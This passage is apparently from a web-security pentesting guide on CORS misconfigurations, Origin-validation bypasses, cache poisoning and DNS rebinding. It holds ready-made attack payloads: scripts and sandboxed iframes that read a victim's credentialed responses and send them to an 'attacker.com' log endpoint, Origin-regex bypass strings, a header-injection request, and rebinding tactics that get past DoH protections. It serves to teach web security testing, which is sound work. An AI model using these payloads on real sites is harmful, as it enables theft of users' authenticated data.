  \ Resource Sharing (CORS) standard **enables servers to define who can access their assets** and **which HTTP request methods\
  \ are permitted** from external sources.\n\nA **same-origin** policy mandates that a **server requesting** a resource and\
  \ the server hosting the **resource** share the same protocol (e.g., `http://`), domain name (e.g., `internal-web.com`),\
  \ and **port** (e.g., 80). Under this policy, only web pages from the same domain and port are allowed access to the resources.\n\
  \nThe application of the same-origin policy in the context of `http://normal-website.com/example/example.html` is illustrated\
  \ as follows:\n\n| URL accessed                              | Access permitted?                       |\n| -----------------------------------------\
  \ | --------------------------------------- |\n| `http://normal-website.com/example/`      | Yes: Identical scheme, domain,\
  \ and port |\n| `http://normal-website.com/example2/`     | Yes: Identical scheme, domain, and port |\n| `https://normal-website.com/example/`\
  \     | No: Different scheme and port           |\n| `http://en.normal-website.com/example/`   | No: Different domain  \
  \                  |\n| `http://www.normal-website.com/example/`  | No: Different domain                    |\n| `http://normal-website.com:8080/example/`\
  \ | No: Different port\\*                    |\n\n\\*Internet Explorer disregards the port number in enforcing the same-origin\
  \ policy, thus allowing this access.\n\n### `Access-Control-Allow-Origin` Header\n\nThis header can allow **multiple origins**,\
  \ a **`null`** value, or a wildcard **`*`**. However, **no browser supports multiple origins**, and the use of the wildcard\
  \ `*` is subject to **limitations**. (The wildcard must be used alone, and its use alongside `Access-Control-Allow-Credentials:\
  \ true` is not permitted.)\n\nThis header is **issued by a server** in response to a cross-domain resource request initiated\
  \ by a website, with the browser automatically adding an `Origin` header.\n\n### `Access-Control-Allow-Credentials` Header\n\
  \nBy **default**, cross-origin requests are made without credentials like cookies or the Authorization header. Yet, a cross-domain\
  \ server can allow the reading of the response when credentials are sent by setting the `Access-Control-Allow-Credentials`\
  \ header to **`true`**.\n\nIf set to `true`, the browser will transmit credentials (cookies, authorization headers, or TLS\
  \ client certificates).\n\n```javascript\nvar xhr = new XMLHttpRequest()\nxhr.onreadystatechange = function () {\n  if (xhr.readyState\
  \ === XMLHttpRequest.DONE && xhr.status === 200) {\n    console.log(xhr.responseText)\n  }\n}\nxhr.open(\"GET\", \"http://example.com/\"\
  , true)\nxhr.withCredentials = true\nxhr.send(null)\n```\n\n```javascript\nfetch(url, {\n  credentials: \"include\",\n})\n\
  ```\n\n```javascript\nconst xhr = new XMLHttpRequest()\nxhr.open(\"POST\", \"https://bar.other/resources/post-here/\")\n\
  xhr.setRequestHeader(\"X-PINGOTHER\", \"pingpong\")\nxhr.setRequestHeader(\"Content-Type\", \"application/xml\")\nxhr.onreadystatechange\
  \ = handler\nxhr.send(\"<person><name>Arun</name></person>\")\n```\n\n### CSRF Pre-flight request\n\n### Understanding Pre-flight\
  \ Requests in Cross-Domain Communication\n\nWhen initiating a cross-domain request under specific conditions, such as using\
  \ a **non-standard HTTP method** (anything other than HEAD, GET, POST), introducing new **headers**, or employing a special\
  \ **Content-Type header value**, a pre-flight request may be required. This preliminary request, leveraging the **`OPTIONS`**\
  \ method, serves to inform the server of the forthcoming cross-origin request's intentions, including the HTTP methods and\
  \ headers it intends to use.\n\nThe **Cross-Origin Resource Sharing (CORS)** protocol mandates this pre-flight check to\
  \ determine the feasibility of the requested cross-origin operation by verifying the allowed methods, headers, and the trustworthiness\
  \ of the origin. For a detailed understanding of what conditions circumvent the need for a pre-flight request, refer to\
  \ the comprehensive guide provided by [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests).\n\
  \nIt's crucial to note that the **absence of a pre-flight request does not negate the requirement for the response to carry\
  \ authorization headers**. Without these headers, the browser is incapacitated in its ability to process the response from\
  \ the cross-origin request.\n\nConsider the following illustration of a pre-flight request aimed at employing the `PUT`\
  \ method along with a custom header named `Special-Request-Header`:\n\n```\nOPTIONS /info HTTP/1.1\nHost: example2.com\n\
  ...\nOrigin: https://example.com\nAccess-Control-Request-Method: POST\nAccess-Control-Request-Headers: Authorization\n```\n\
  \nIn response, the server might return headers indicating the accepted methods, the allowed origin, and other CORS policy\
  \ details, as shown below:\n\n```markdown\nHTTP/1.1 204 No Content\n...\nAccess-Control-Allow-Origin: https://example.com\n\
  Access-Control-Allow-Methods: PUT, POST, OPTIONS\nAccess-Control-Allow-Headers: Authorization\nAccess-Control-Allow-Credentials:\
  \ true\nAccess-Control-Max-Age: 240\n```\n\n- **`Access-Control-Allow-Headers`**: This header specifies which headers can\
  \ be used during the actual request. It is set by the server to indicate the allowed headers in requests from the client.\n\
  - **`Access-Control-Expose-Headers`**: Through this header, the server informs the client about which headers can be exposed\
  \ as part of the response besides the simple response headers.\n- **`Access-Control-Max-Age`**: This header indicates how\
  \ long the results of a pre-flight request can be cached. The server sets the maximum time, in seconds, that the information\
  \ returned by a pre-flight request may be reused.\n- **`Access-Control-Request-Headers`**: Used in pre-flight requests,\
  \ this header is set by the client to inform the server about which HTTP headers the client wants to use in the actual request.\n\
  - **`Access-Control-Request-Method`**: This header, also used in pre-flight requests, is set by the client to indicate which\
  \ HTTP method will be used in the actual request.\n- **`Origin`**: This header is automatically set by the browser and indicates\
  \ the origin of the cross-origin request. It is used by the server to assess whether the incoming request should be allowed\
  \ or denied based on the CORS policy.\n\nNote that usually (depending on the content-type and headers set) in a **GET/POST\
  \ request no pre-flight request is sent** (the request is sent **directly**), but if you want to access the **headers/body\
  \ of the response**, it must contains an _Access-Control-Allow-Origin_ header allowing it.\\\n**Therefore, CORS doesn't\
  \ protect against CSRF (but it can be helpful).**\n\n### **Local Network Requests Pre-flight request**\n\nModern browsers\
  \ and the current **Private Network Access (PNA)** draft use the headers **`Access-Control-Request-Private-Network: true`**\
  \ in the preflight and **`Access-Control-Allow-Private-Network: true`** in the response. Older articles and PoCs may still\
  \ refer to `Local-Network` header names, but for current testing you should expect the `Private-Network` variants.\n\nA\
  \ **valid response allowing the local network request** needs to also include `Access-Control-Allow-Private-Network: true`:\n\
  \n```\nHTTP/1.1 200 OK\n...\nAccess-Control-Allow-Origin: https://example.com\nAccess-Control-Allow-Methods: GET\nAccess-Control-Allow-Credentials:\
  \ true\nAccess-Control-Allow-Private-Network: true\nContent-Length: 0\n...\n```\n\nAnd the preflight request will look similar\
  \ to:\n\n```http\nOPTIONS / HTTP/1.1\nHost: router.local\nOrigin: https://example.com\nAccess-Control-Request-Method: GET\n\
  Access-Control-Request-Private-Network: true\n```\n\n> [!NOTE]\n> Chrome's PNA rollout changed several times during 2024.\
  \ As of **October 9, 2024**, Chrome documented that **PNA preflights were on hold** because of compatibility problems, while\
  \ secure-context restrictions remained in place. Therefore, keep testing both the **spec-compliant preflight flow** and\
  \ the older **\"works in practice because enforcement is incomplete\"** behavior.\n\n> [!WARNING]\n> Note that the linux\
  \ **0.0.0.0** IP works to **bypass** these requirements to access localhost as that IP address is not considered \"local\"\
  .\n>\n> Chrome also documented that **`0.0.0.0/8`** is now treated as part of Private Network Access, so this trick is browser/version-dependent\
  \ and should be re-tested instead of assumed.\n>\n> It's also possible to **bypass the Local Network requirements** if you\
  \ use the **public IP address of a local endpoint** (like the public IP of the router). Because in several occasions, even\
  \ if the **public IP** is being accessed, if it's **from the local network**, access will be granted.\n\n### Wildcards\n\
  \nNote that even if the following configuration might look super permissive:\n\n```bash\nAccess-Control-Allow-Origin: *\n\
  Access-Control-Allow-Credentials: true\n```\n\nThis is not allowed by browsers and therefore credentials won't be sent with\
  \ the request allowed by this.\n\n## Exploitable misconfigurations\n\nIt has been observed that the setting of `Access-Control-Allow-Credentials`\
  \ to **`true`** is a prerequisite for most **real attacks**. This setting permits the browser to send credentials and read\
  \ the response, enhancing the attack's effectiveness. Without this, the benefit of making a browser issue a request over\
  \ doing it oneself diminishes, as leveraging a user's cookies becomes unfeasible.\n\n### Exception: Exploiting Network Location\
  \ as Authentication\n\nAn exception exists where the victim's network location acts as a form of authentication. This allows\
  \ for the victim's browser to be used as a proxy, circumventing IP-based authentication to access intranet applications.\
  \ This method shares similarities in impact with DNS rebinding but is simpler to exploit.\n\n### Reflection of `Origin`\
  \ in `Access-Control-Allow-Origin`\n\nThe real-world scenario where the `Origin` header's value is reflected in `Access-Control-Allow-Origin`\
  \ is theoretically improbable due to restrictions on combining these headers. However, developers seeking to enable CORS\
  \ for multiple URLs may dynamically generate the `Access-Control-Allow-Origin` header by copying the `Origin` header's value.\
  \ This approach can introduce vulnerabilities, particularly when an attacker employs a domain with a name designed to appear\
  \ legitimate, thereby deceiving the validation logic.\n\n```html\n<script>\n  var req = new XMLHttpRequest()\n  req.onload\
  \ = reqListener\n  req.open(\"get\", \"https://example.com/details\", true)\n  req.withCredentials = true\n  req.send()\n\
  \  function reqListener() {\n    location = \"/log?key=\" + this.responseText\n  }\n</script>\n```\n\n### Exploiting the\
  \ `null` Origin\n\nThe `null` origin, specified for situations like redirects or local HTML files, holds a unique position.\
  \ Some applications whitelist this origin to facilitate local development, inadvertently allowing any website to mimic a\
  \ `null` origin through a sandboxed iframe, thus bypassing CORS restrictions.\n\n```html\n<iframe\n  sandbox=\"allow-scripts\
  \ allow-top-navigation allow-forms\"\n  src=\"data:text/html,<script>\n  var req = new XMLHttpRequest();\n  req.onload =\
  \ reqListener;\n  req.open('get','https://example/details',true);\n  req.withCredentials = true;\n  req.send();\n  function\
  \ reqListener() {\n    location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);\n  };\n</script>\"\
  ></iframe>\n```\n\n```html\n<iframe\n  sandbox=\"allow-scripts allow-top-navigation allow-forms\"\n  srcdoc=\"<script>\n\
  \  var req = new XMLHttpRequest();\n  req.onload = reqListener;\n  req.open('get','https://example/details',true);\n  req.withCredentials\
  \ = true;\n  req.send();\n  function reqListener() {\n    location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);\n\
  \  };\n</script>\"></iframe>\n```\n\n### Regular Expression Bypass Techniques\n\nWhen encountering a domain whitelist, it's\
  \ crucial to test for bypass opportunities, such as appending the attacker's domain to a whitelisted domain or exploiting\
  \ subdomain takeover vulnerabilities. Additionally, regular expressions used for domain validation may overlook nuances\
  \ in domain naming conventions, presenting further bypass opportunities.\n\n### Advanced Regular Expression Bypasses\n\n\
  Regex patterns typically concentrate on alphanumeric, dot (.), and hyphen (-) characters, neglecting other possibilities.\
  \ For example, a domain name crafted to include characters interpreted differently by browsers and regex patterns can bypass\
  \ security checks. Safari, Chrome, and Firefox's handling of underscore characters in subdomains illustrates how such discrepancies\
  \ can be exploited to circumvent domain validation logic.\n\n**For more information and settings of this bypass check:**\
  \ [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **and** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)\n\

  ### From XSS inside a subdomain\n\nDevelopers often implement defensive mechanisms to protect against CORS exploitation\
  \ by whitelisting domains that are permitted to request information. Despite these precautions, the system's security is\
  \ not foolproof. The presence of even a single vulnerable subdomain within the whitelisted domains can open the door to\
  \ CORS exploitation through other vulnerabilities, such as XSS (Cross-Site Scripting).\n\nTo illustrate, consider the scenario\
  \ where a domain, `requester.com`, is whitelisted to access resources from another domain, `provider.com`. The server-side\
  \ configuration might look something like this:\n\n```javascript\nif ($_SERVER[\"HTTP_HOST\"] == \"*.requester.com\") {\n\
  \  // Access data\n} else {\n  // Unauthorized access\n}\n```\n\nIn this setup, all subdomains of `requester.com` are allowed\
  \ access. However, if a subdomain, say `sub.requester.com`, is compromised with an XSS vulnerability, an attacker can leverage\
  \ this weakness. For example, an attacker with access to `sub.requester.com` could exploit the XSS vulnerability to bypass\
  \ CORS policies and maliciously access resources on `provider.com`.\n\n### **Special Characters**\n\nPortSwigger’s [URL\
  \ validation bypass cheat sheet](https://portswigger.net/research/introducing-the-url-validation-bypass-cheat-sheet) found\
  \ that some browsers support strange characters within domain names.\n\nChrome and Firefox support underscores `_` that\
  \ can bypass regexes implemented to validate the `Origin` header:\n\n```\nGET / HTTP/2\nCookie: <session_cookie>\nOrigin:\
  \ https://target.application_.arbitrary.com\n```\n\n```\nHTTP/2 200 OK\nAccess-Control-Allow-Origin: https://target.application_.arbitrary.com\n\
  Access-Control-Allow-Credentials: true\n```\n\nSafari is even more lax accepting special characters in the domain name:\n\
  \n```\nGET / HTTP/2\nCookie: <session_cookie>\nOrigin: https://target.application}.arbitrary.com\n```\n\n```\nHTTP/2 200\
  \ OK\nCookie: <session_cookie>\nAccess-Control-Allow-Origin: https://target.application}.arbitrary.com\nAccess-Control-Allow-Credentials:\
  \ true\n```\n\nRecent updates to PortSwigger's cheat sheet added more **Safari-oriented domain splitting** payloads that\
  \ are worth fuzzing when the target validates the `Origin` header using regexes or home-grown URL parsers:\n\n```text\n\
  https://example.com.{.attacker.com/\nhttps://example.com.}.attacker.com/\nhttps://example.com.`.attacker.com/\n```\n\nThese\
  \ are useful when the backend only checks whether the supplied origin *starts with* or *contains* the trusted hostname,\
  \ while the browser still treats the attacker-controlled suffix as the effective origin boundary.\n\nAlso remember that\
  \ modern origin fuzzing should not stop at hostname suffixes. The current PortSwigger cheat sheet includes payload families\
  \ for:\n\n- **Domain allow-list bypasses**: attacker-controlled domains that still satisfy naive prefix/suffix/substring\
  \ checks.\n- **Fake-relative absolute URLs**: browser-valid absolute URLs that application code may parse as relative.\n\
  - **Loopback/IP normalizations**: alternative IPv4/IPv6 forms useful when CORS logic tries to block `localhost`, `127.0.0.1`,\
  \ or cloud metadata endpoints by string comparison.\n\n### **Other funny URL tricks**\n\n\n{{#ref}}\nssrf-server-side-request-forgery/url-format-bypass.md\n\
  {{#endref}}\n\n### **Server-side cache poisoning**\n\n[**From this research**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)\n\
  \nIt's possible that by exploiting server-side cache poisoning through HTTP header injection, a stored Cross-Site Scripting\
  \ (XSS) vulnerability can be induced. This scenario unfolds when an application fails to sanitize the `Origin` header for\
  \ illegal characters, creating a vulnerability particularly for Internet Explorer and Edge users. These browsers treat (0x0d)\
  \ as a legitimate HTTP header terminator, leading to HTTP header injection vulnerabilities.\n\nConsider the following request\
  \ where the `Origin` header is manipulated:\n\n```\nGET / HTTP/1.1\nOrigin: z[0x0d]Content-Type: text/html; charset=UTF-7\n\
  ```\n\nInternet Explorer and Edge interpret the response as:\n\n```\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: z\nContent-Type:\
  \ text/html; charset=UTF-7\n```\n\nWhile directly exploiting this vulnerability by making a web browser send a malformed\
  \ header is not feasible, a crafted request can be manually generated using tools like Burp Suite. This method could lead\
  \ to a server-side cache saving the response and inadvertently serving it to others. The crafted payload aims to alter the\
  \ page's character set to UTF-7, a character encoding often associated with XSS vulnerabilities due to its ability to encode\
  \ characters in a way that can be executed as script in certain contexts.\n\nFor further reading on stored XSS vulnerabilities,\
  \ see [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).\n\n**Note**: The exploitation of\
  \ HTTP header injection vulnerabilities, particularly through server-side cache poisoning, underscores the critical importance\
  \ of validating and sanitizing all user-supplied input, including HTTP headers. Always employ a robust security model that\
  \ includes input validation to prevent such vulnerabilities.\n\n### **Client-Side cache poisoning**\n\n[**From this research**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)\n\
  \nIn this scenario, an instance of a web page reflecting the contents of a custom HTTP header without proper encoding is\
  \ observed. Specifically, the web page reflects back the contents included in a `X-User-id` header, which could include\
  \ malicious JavaScript, as demonstrated by the example where the header contains an SVG image tag designed to execute JavaScript\
  \ code on load.\n\nCross-Origin Resource Sharing (CORS) policies allow for the sending of custom headers. However, without\
  \ the response being directly rendered by the browser due to CORS restrictions, the utility of such an injection might seem\
  \ limited. The critical point arises when considering the browser's cache behavior. If the `Vary: Origin` header is not\
  \ specified, it becomes possible for the malicious response to be cached by the browser. Subsequently, this cached response\
  \ could be rendered directly when navigating to the URL, bypassing the need for direct rendering upon the initial request.\
  \ This mechanism enhances the reliability of the attack by leveraging client-side caching.\n\nTo illustrate this attack,\
  \ a JavaScript example is provided, designed to be executed in the environment of a web page, such as through a JSFiddle.\
  \ This script performs a simple action: it sends a request to a specified URL with a custom header containing the malicious\
  \ JavaScript. Upon successful request completion, it attempts to navigate to the target URL, potentially triggering the\
  \ execution of the injected script if the response has been cached without proper handling of the `Vary: Origin` header.\n\
  \nHere's a summarized breakdown of the JavaScript used to execute this attack:\n\n```html\n<script>\n  function gotcha()\
  \ {\n    location = url\n  }\n  var req = new XMLHttpRequest()\n  url = \"https://example.com/\" // Note: Be cautious of\
  \ mixed content blocking for HTTP sites\n  req.onload = gotcha\n  req.open(\"get\", url, true)\n  req.setRequestHeader(\"\
  X-Custom-Header\", \"<svg/onload=alert(1)>\")\n  req.send()\n</script>\n```\n\n## Bypass\n\n### XSSI (Cross-Site Script\
  \ Inclusion) / JSONP\n\nXSSI, also known as Cross-Site Script Inclusion, is a type of vulnerability that takes advantage\
  \ of the fact that the Same Origin Policy (SOP) does not apply when including resources using the script tag. This is because\
  \ scripts need to be able to be included from different domains. This vulnerability allows an attacker to access and read\
  \ any content that was included using the script tag.\n\nThis vulnerability becomes particularly significant when it comes\
  \ to dynamic JavaScript or JSONP (JSON with Padding), especially when ambient-authority information like cookies are used\
  \ for authentication. When requesting a resource from a different host, the cookies are included, making them accessible\
  \ to the attacker.\n\nTo better understand and mitigate this vulnerability, you can use the BurpSuite plugin available at\
  \ [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp). This plugin can help identify and address potential\
  \ XSSI vulnerabilities in your web applications.\n\n[**Read more about the difefrent types of XSSI and how to exploit them\
  \ here.**](xssi-cross-site-script-inclusion.md)\n\nTry to add a **`callback`** **parameter** in the request. Maybe the page\
  \ was prepared to send the data as JSONP. In that case the page will send back the data with `Content-Type: application/javascript`\
  \ which will bypass the CORS policy.\n\n![](<../images/image (856).png>)\n\n### Easy (useless?) bypass\n\nOne way to bypass\
  \ the `Access-Control-Allow-Origin` restriction is by requesting a web application to make a request on your behalf and\
  \ send back the response. However, in this scenario, the credentials of the final victim won't be sent as the request is\
  \ made to a different domain.\n\n1. [**CORS-escape**](https://github.com/shalvah/cors-escape): This tool provides a proxy\
  \ that forwards your request along with its headers, while also spoofing the Origin header to match the requested domain.\
  \ This effectively bypasses the CORS policy. Here's an example usage with XMLHttpRequest:\n2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape):\
  \ This tool offers an alternative approach to proxying requests. Instead of passing on your request as-is, the server makes\
  \ its own request with the specified parameters.\n\n### Iframe + Popup Bypass\n\nYou can **bypass CORS checks** such as\
  \ `e.origin === window.origin` by **creating an iframe** and **from it opening a new window**. More information in the following\
  \ page:\n\n\n{{#ref}}\nxss-cross-site-scripting/iframes-in-xss-and-csp.md\n{{#endref}}\n\n### DNS Rebinding via TTL\n\n\
  DNS rebinding via TTL is a technique used to bypass certain security measures by manipulating DNS records. Here's how it\
  \ works:\n\n1. The attacker creates a web page and makes the victim access it.\n2. The attacker then changes the DNS (IP)\
  \ of their own domain to point to the victim's web page.\n3. The victim's browser caches the DNS response, which may have\
  \ a TTL (Time to Live) value indicating how long the DNS record should be considered valid.\n4. When the TTL expires, the\
  \ victim's browser makes a new DNS request, allowing the attacker to execute JavaScript code on the victim's page.\n5. By\
  \ maintaining control over the IP of the victim, the attacker can gather information from the victim without sending any\
  \ cookies to the victim server.\n\nIt's important to note that browsers have caching mechanisms that may prevent immediate\
  \ abuse of this technique, even with low TTL values.\n\nDNS rebinding can be useful for bypassing explicit IP checks performed\
  \ by the victim or for scenarios where a user or bot remains on the same page for an extended period, allowing the cache\
  \ to expire.\n\nIf you need a quick way to abuse DNS rebinding, you can use services like [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).\n\
  \nTo run your own DNS rebinding server, you can utilize tools like **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)).\
  \ This involves exposing your local port 53/udp, creating an A record pointing to it (e.g., ns.example.com), and creating\
  \ an NS record pointing to the previously created A subdomain (e.g., ns.example.com). Any subdomain of the ns.example.com\
  \ subdomain will then be resolved by your host.\n\nYou can also explore a publicly running server at [http://rebind.it/singularity.html](http://rebind.it/singularity.html)\
  \ for further understanding and experimentation.\n\n### DNS Rebinding via **DNS Cache Flooding**\n\nDNS rebinding via DNS\
  \ cache flooding is another technique used to bypass the caching mechanism of browsers and force a second DNS request. Here's\
  \ how it works:\n\n1. Initially, when the victim makes a DNS request, it is responded with the attacker's IP address.\n\
  2. To bypass the caching defense, the attacker leverages a service worker. The service worker floods the DNS cache, which\
  \ effectively deletes the cached attacker server name.\n3. When the victim's browser makes a second DNS request, it is now\
  \ responded with the IP address 127.0.0.1, which typically refers to the localhost.\n\nBy flooding the DNS cache with the\
  \ service worker, the attacker can manipulate the DNS resolution process and force the victim's browser to make a second\
  \ request, this time resolving to the attacker's desired IP address.\n\n### DNS Rebinding via **Cache**\n\nAnother way to\
  \ bypass the caching defense is by utilizing multiple IP addresses for the same subdomain in the DNS provider. Here's how\
  \ it works:\n\n1. The attacker sets up two A records (or a single A record with two IPs) for the same subdomain in the DNS\
  \ provider.\n2. When a browser checks for these records, it receives both IP addresses.\n3. If the browser decides to use\
  \ the attacker's IP address first, the attacker can serve a payload that performs HTTP requests to the same domain.\n4.\
  \ However, once the attacker obtains the victim's IP address, they stop responding to the victim's browser.\n5. The victim's\
  \ browser, upon realizing that the domain is unresponsive, moves on to use the second given IP address.\n6. By accessing\

  \n### DNS Rebidding Weaponized\n\nYou can find more information about the previous bypass techniques and how to use the\
  \ following tool in the talk [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ).\n\
  \n[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) is a tool to perform [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding)\
  \ attacks. It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine's\
  \ IP address and to serve attack payloads to exploit vulnerable software on the target machine.\n\n### DNS Rebinding over\
  \ DNS-over-HTTPS (DoH)\n\nDoH simply tunnels the classic RFC1035 DNS wire format inside HTTPS (usually a POST with `Content-Type:\
  \ application/dns-message`). The resolver still answers with the same resource records, so SOP-breaking techniques continue\
  \ to work even when browsers resolve the attacker-controlled hostname via TLS.\n\n#### Key observations\n\n- Chrome (Windows/macOS)\
  \ and Firefox (Linux) successfully rebind when configured for Cloudflare, Google, or OpenDNS DoH resolvers. Transport encryption\
  \ neither delays nor blocks the attack-flow for **first-then-second**, **multiple-answers**, or **DNS cache flooding** strategies.\n\
  - Public resolvers still see every query, but they rarely enforce the host-to-IP mapping a browser must honor. Once the\
  \ authoritative server returns the rebinding sequence, the browser keeps the original origin tuple while connecting to the\
  \ new IP.\n\n#### Singularity strategies and timing over DoH\n\n- **First-then-second** remains the most reliable option:\
  \ the first lookup returns the attacker IP that serves the payload, every later lookup returns the internal/localhost IP.\
  \ With typical browser DNS caches this flips traffic in ~40–60 seconds, even when the recursive resolver is only reachable\
  \ over HTTPS.\n- **Multiple answers (fast rebinding)** still reaches localhost in <3 seconds by answering with two A records\
  \ (attacker IP + `0.0.0.0` on Linux/macOS or `127.0.0.1` on Windows) and programmatically blackholing the first IP (for\
  \ example, `iptables -I OUTPUT -d <attacker_ip> -j DROP`) shortly after the page loads. Firefox’s DoH implementation may\
  \ emit repeated DNS queries, so the Singularity fix is to schedule the firewall rule relative to the **first** query timestamp\
  \ instead of refreshing the timer on every query.\n\n#### Beating “rebind protection” in DoH providers\n\n- Some providers\
  \ (e.g., NextDNS) replace private/loopback answers with `0.0.0.0`, but Linux and macOS happily route that destination to\
  \ local services. Intentionally returning `0.0.0.0` as the second record therefore still pivots the origin to localhost.\n\
  - Filtering only the direct A/AAAA response is ineffective: returning a **CNAME** to an internal-only hostname makes the\
  \ public DoH resolver forward the alias while browsers such as Firefox fall back to the system DNS for the internal zone,\
  \ completing the resolution to a private IP that is still treated as the attacker origin.\n\n#### Browser-specific DoH behavior\n\
  \n- **Firefox DoH** operates in fallback mode: any DoH failure (including an unresolved CNAME target) triggers a plaintext\
  \ lookup via the OS resolver, which is typically an enterprise DNS server that knows the internal namespace. This behavior\
  \ is what makes the CNAME bypass reliable inside corporate networks.\n- **Chrome DoH** only activates when the OS DNS points\
  \ to a whitelisted DoH-capable recursive resolver (Cloudflare, Google, Quad9, etc.) and does not provide the same fallback\
  \ chain. Internal hostnames that only exist on corporate DNS therefore fail to resolve, but rebinding toward localhost or\
  \ any routable address still succeeds because the attacker controls the entire response set.\n\n#### Testing and monitoring\
  \ DoH flows\n\n- Firefox: `Settings ➜ Network Settings ➜ Enable DNS over HTTPS` and provide the DoH endpoint (Cloudflare\
  \ and NextDNS are built in). Chrome/Chromium: enable `chrome://flags/#dns-over-https` and configure the OS DNS servers to\
  \ one of Chrome’s supported resolvers (e.g., `1.1.1.1`/`1.0.0.1`).\n- You can query public DoH APIs directly, e.g. `curl\
  \ -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=example.com&type=A' | jq` to confirm the\
  \ exact records browsers will cache.\n- Intercepting DoH in Burp/ZAP still works because it is just HTTPS (binary DNS payload\
  \ in the body). For packet-level inspection, export TLS keys (`export SSLKEYLOGFILE=~/SSLKEYLOGFILE.txt`) before launching\
  \ the browser and let Wireshark decrypt the DoH sessions with the `dns` display filter to see when the browser stays on\
  \ DoH or falls back to classic DNS.\n\n### Real Protection against DNS Rebinding\n\n- Use TLS in internal services\n- Request\
  \ authentication to access data\n- Validate the Host header\n- [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/):\
